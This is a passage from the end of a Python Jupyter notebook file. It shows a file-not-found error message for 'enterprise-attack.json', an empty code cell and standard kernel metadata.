    "else:\n",
    "    print(f\"Error: File not found at {file_path}. Please ensure 'enterprise-attack.json' is in the same directory as your script.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3dde606d",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
